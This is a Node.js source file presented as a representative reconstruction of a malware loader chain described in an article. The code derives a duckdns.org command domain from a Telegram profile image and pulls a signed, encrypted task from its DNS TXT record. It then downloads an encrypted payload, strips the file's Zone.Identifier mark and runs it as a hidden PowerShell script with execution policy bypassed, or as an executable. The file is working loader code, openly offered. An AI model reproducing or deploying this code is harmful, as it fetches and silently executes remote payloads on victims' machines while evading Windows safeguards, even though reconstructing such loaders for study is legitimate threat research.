// Representative Node adaptation of the article's documented loader chain.
const crypto = require('node:crypto');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const {spawn} = require('node:child_process');
const FIRST = [
    "silver", "amber", "wild", "tiny", "brave", "lucky", "calm",
    "sharp", "swift", "bright", "quiet", "bold", "gentle", "fierce",
    "royal", "mystic", "username", "degenerate", "allblack", "kizta",
    "graf",
];
const SECOND = [
    "tiger", "river", "stone", "cloud", "wolf", "ocean", "forest",
    "mountain", "eagle", "raven", "ember", "comet", "fox", "dragon",
    "piano", "viper", "yoba", "yyoba", "static", "cpp", "example",
];
const THIRD = [
    "runs", "jumps", "sings", "sleeps", "flies", "hunts", "burns",
    "floats", "shines", "whispers", "roars", "dreams", "strikes",
    "glides", "watches", "hides", "duty", "free",
];

const key = Buffer.from('1d0d1368b4d53f3a6322cf40e84e63db', 'hex');
const publicKey = crypto.createPublicKey({key: Buffer.from('302a300506032b6570032100' +
    'b5c2d20623d4e6647d06a42864edd8629f82c5c384b243fdaeeeca24b3873d64', 'hex'), format: 'der', type: 'spki'});
function hashBytes(data, seed) {
    let value = BigInt(seed);
    for (const byte of data) value = BigInt.asUintN(64, (value ^ BigInt(byte)) * 0x1000193n);
    return value;
}
function decrypt(data) {
    const cipher = crypto.createDecipheriv('aes-128-ecb', key, null);
    return Buffer.concat([cipher.update(data), cipher.final()]);
}
async function readUrl(url) {
    return Buffer.from(await (await fetch(url)).arrayBuffer());
}
async function lookup() {
    const page = (await readUrl('https://t.me/public_profile')).toString();
    const photoUrl = page.match(/class="tgme_page_photo_image"[^>]*src="([^"]+)"/)[1];
    const image = await readUrl(photoUrl);
    const tail = image.subarray(-50);
    const first = FIRST[Number(hashBytes(tail, 0x811c9dc5) % BigInt(FIRST.length))];
    const second = SECOND[Number(hashBytes(tail, 0xaf0154a5) % BigInt(SECOND.length))];
    const third = THIRD[Number(hashBytes(tail, 0xfe5439e4) % BigInt(THIRD.length))];
    const number = hashBytes(tail, 0xffa7471a) % 1000n;
    const domain = `${first}-${second}-${third}-${number}.duckdns.org`;
    const response = await fetch(`https://dns.google/resolve?name=${domain}&type=TXT`);
    const answer = (await response.json()).Answer.find(record => record.type === 16);
    const envelope = Buffer.from(answer.data.replace(/^"|"$/g, ''), 'base64');
    // Representative signature-prefix framing, unspecified by the report.
    const signature = envelope.subarray(0, 64), ciphertext = envelope.subarray(64);
    if (!crypto.verify(null, ciphertext, publicKey, signature)) throw Error('Invalid signature');
    return decrypt(ciphertext).toString();
}
async function activate(task) {
    const mode = task[0], url = task.substring(1);
    const content = decrypt(await readUrl(url));
    const directory = path.join(os.tmpdir(), crypto.randomBytes(5).toString('hex'));
    fs.mkdirSync(directory);
    const destination = path.join(directory, crypto.randomBytes(5).toString('hex') + (mode === '3' ? '.ps1' : '.exe'));
    fs.writeFileSync(destination, content);
    if (mode === '3') {
        spawn('powershell.exe', ['-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass', '-File', destination]);
    } else if (mode === '2') {
        try { fs.unlinkSync(destination + ':Zone.Identifier'); } catch (e) { if (e.code !== 'ENOENT') throw e; }
        spawn(destination, []);
    } else { throw Error('Injection path omitted'); }
}
lookup().then(activate);
